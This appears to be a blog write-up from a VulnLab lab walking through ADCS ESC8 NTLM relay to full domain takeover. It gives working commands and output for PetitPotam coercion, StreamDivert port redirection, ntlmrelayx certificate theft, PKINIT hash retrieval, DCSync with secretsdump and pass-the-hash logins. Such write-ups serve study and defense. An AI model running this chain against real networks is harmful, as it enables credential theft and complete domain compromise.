excerpt: Step-by-step walkthrough of ADCS ESC8 exploitation over HTTP Web Enrollment
  using NTLM Relay for full Active Directory domain escalation.
---




## Introduction

**ESC8** is a vulnerability in **Active Directory Certificate Services (ADCS)** that occurs when the **Web Enrollment** service is enabled over HTTP without encryption, or over HTTPS without **Channel Binding (EPA)** enabled.

The vulnerable endpoint is:

```
http://<CA>/certsrv/certfnsh.asp
```

This endpoint accepts **NTLM authentication without signing or channel binding**, making it susceptible to **NTLM Relay** attacks. In essence, an attacker can intercept the NTLM authentication of a privileged account (such as the Domain Controller's machine account) and relay it to the ADCS service to obtain a valid certificate on behalf of that account.

### Why is this critical?

Domain Controller machine accounts (`BERSRV100$`) hold elevated privileges in the domain. If we obtain a valid certificate in the name of the DC, we can chain the following steps:

```
DC Certificate → PKINIT → DC NT hash → DCSync → all domain hashes
```

This leads us directly to **full compromise of the Active Directory domain**.

## Scenario

This technique was discovered during the resolution of the **Kaiju** Mini ProLab from VulnLab. The lab infrastructure is as follows:

```
10.10.14.59   Kali Linux    → attacker machine
172.16.90.50  BERSRV200     → pivot point (previously compromised)
172.16.90.60  BERSRV100     → Domain Controller + root CA (kaiju-CA)
172.16.90.61  BERSRV105     → Subordinate CA (kaiju-sub-CA) ← ESC8 here
```

---

## Phase 1 — ADCS Enumeration

Before executing the attack, we need to confirm that ADCS exists on the network and that some CA has ESC8. We start with **NetExec** to discover if there is an ADCS server:

```bash
nxc ldap 172.16.90.60 -u clare.frost -p 'a...' -d kaiju.vl -M adcs
```

![NetExec ADCS discovery](/assets/images/posts/ESC8_Kaiju/nxc_adcs.png)

NetExec confirms two CAs in the domain: `kaiju-CA` on BERSRV100 and `kaiju-sub-CA` on BERSRV105. We now use **Certipy** to look for specific vulnerabilities:

```bash
certipy find -u clare.frost -p 'a...' -dc-ip 172.16.90.60 -vulnerable -stdout
```

```
  0
    CA Name                             : kaiju-sub-CA
    DNS Name                            : BERSRV105.kaiju.vl
    Web Enrollment
      HTTP
        Enabled                         : True       ← no encryption, vulnerable
      HTTPS
        Enabled                         : False
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
  1
    CA Name                             : kaiju-CA
    DNS Name                            : BERSRV100.kaiju.vl
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : False      ← no protection
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP and HTTPS, and Channel Binding is disabled.
```

Certipy confirms **ESC8 on both CAs**. We will use `kaiju-sub-CA` on BERSRV105 as the relay target since it has HTTP web enrollment enabled with no additional protection.

---

## Phase 2 — Environment Setup

### The network problem

Our attacking Kali machine (`10.10.14.59`) is on the HTB VPN network and **has no direct reach** to the internal network `172.16.90.0/24`. To solve this, we use **Ligolo-ng** to pivot through BERSRV200, which has access to both networks.

However, there is an additional problem: for the relay to work, the DC needs to authenticate to us on **port 445**. But that port on BERSRV200 is already occupied by the native Windows SMB service and cannot be easily freed.

The solution is **port bending** with **StreamDivert** — a tool that intercepts network traffic at the kernel level on BERSRV200 and transparently redirects it to our Kali, without needing to free port 445.

### Port Bending with StreamDivert

> **StreamDivert**: [https://github.com/jellever/StreamDivert](https://github.com/jellever/StreamDivert)

We upload the three required files to BERSRV200 as Administrator:

```bash
scp StreamDivert.exe WinDivert64.sys WinDivert.dll "Administrator@10.13.38.41:C:/temp/"
```

We create the configuration file `config.txt` on BERSRV200:

```
tcp < 445 0.0.0.0 -> 10.10.14.59 445
```

This rule tells StreamDivert that all incoming TCP traffic to port 445 from any source should be redirected to our Kali at `10.10.14.59:445`. Run it as Administrator:

```powershell
.\StreamDivert.exe config.txt -f -v
```

With this, any NTLM authentication arriving at BERSRV200:445 will be transparently redirected to our Kali, where ntlmrelayx will be waiting.

---

## Phase 3 — Attack Execution

With the environment ready, the attack requires two terminals running in parallel.

### Terminal 1 — ntlmrelayx listening on Kali

We launch ntlmrelayx pointing to the web enrollment endpoint on BERSRV105:

```bash
impacket-ntlmrelayx -t http://172.16.90.61/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
```

- `-t` points to the vulnerable ADCS (kaiju-sub-CA on BERSRV105)
- `--adcs` enables relay mode toward ADCS to request certificates
- `--template DomainController` specifies the certificate template to request
- `-smb2support` enables SMBv2 support

### Terminal 2 — DC Coercion with PetitPotam

We use **PetitPotam** to force the DC to authenticate toward BERSRV200 by abusing MS-EFSRPC functions:

```bash
python3 PetitPotam.py -u 'Clare.Frost' -p 'a...' \
    172.16.90.50 172.16.90.60
```

- `172.16.90.50` → listener (BERSRV200, where StreamDivert redirects to Kali)
- `172.16.90.60` → target (DC BERSRV100 that we want to coerce)

### Relay flow

Once both commands are running, the complete flow is as follows:

![ESC8 attack diagram](/assets/images/posts/ESC8_Kaiju/diagram_esc8.png)

```
DC (172.16.90.60)
    ↓ PetitPotam forces it to authenticate toward BERSRV200:445
BERSRV200:445 (172.16.90.50)
    ↓ StreamDivert intercepts the traffic and redirects it
Kali:445 (10.10.14.59)
    ↓ ntlmrelayx captures BERSRV100$ authentication
    ↓ and relays it to the ADCS HTTP endpoint impersonating the DC
BERSRV105:80 (172.16.90.61)
    ↓ ADCS believes it is the DC requesting a certificate and issues it
BERSRV100.pfx ← certificate for BERSRV100$ obtained
```

ntlmrelayx confirms the relay was successful and writes the certificate to disk:

```
[*] (SMB): Authenticating connection from KAIJU/BERSRV100$@10.13.38.41 against http://172.16.90.61 SUCCEED
[*] http://KAIJU/BERSRV100$@172.16.90.61 -> GOT CERTIFICATE! ID 9
[*] http://KAIJU/BERSRV100$@172.16.90.61 -> Writing PKCS#12 certificate to ./BERSRV100.pfx
[*] http://KAIJU/BERSRV100$@172.16.90.61 -> Certificate successfully written to file
```

---

## Phase 4 — From Certificate to Domain Admin

With the `BERSRV100.pfx` certificate in hand, the path to Domain Admin becomes straightforward.

### Obtain NT hash via PKINIT

We use **Certipy** to authenticate with the certificate via **PKINIT** — a Kerberos authentication mechanism that accepts certificates instead of passwords. This returns the NT hash of the DC's machine account:

```bash
certipy auth -pfx BERSRV100.pfx \
    -dc-ip 172.16.90.60 \
    -username 'BERSRV100$' \
    -domain kaiju.vl
```

```
[*] Got TGT
[*] Trying to retrieve NT hash for 'bersrv100$'
[*] Got hash for 'bersrv100$@kaiju.vl':
    aad3b435b51404eeaad3b435b51404ee:cb55XXXXXXXXXXX
```

### DCSync — full domain dump

With the NT hash of the DC machine account we can perform **DCSync**, which replicates the DC's user database toward us, obtaining the hashes of all domain users:

```bash
impacket-secretsdump \
    -hashes aad3b435b51404eeaad3b435b51404ee:cb55XXXXXXXXXXX \
    'kaiju.vl/BERSRV100$'@172.16.90.60
```

![secretsdump output](/assets/images/posts/ESC8_Kaiju/secretsdump.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b46XXXXXXXXXXX:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e974XXXXXXXXXXX:::
kaiju.vl\clare.frost:1105:...
kaiju.vl\sasrv200:1104:...
```

![Full attack flow](/assets/images/posts/ESC8_Kaiju/flujo_completoo.png)

### Domain Admin

With the Administrator's domain hash we use **Pass-the-Hash** to connect to the servers without needing the plaintext password:

```bash
# Domain Controller
evil-winrm -i 172.16.90.60 -u Administrator -H 0b46XXXXXXXXXXX

# Subordinate CA
evil-winrm -i 172.16.90.61 -u Administrator -H 0b46XXXXXXXXXXX
```
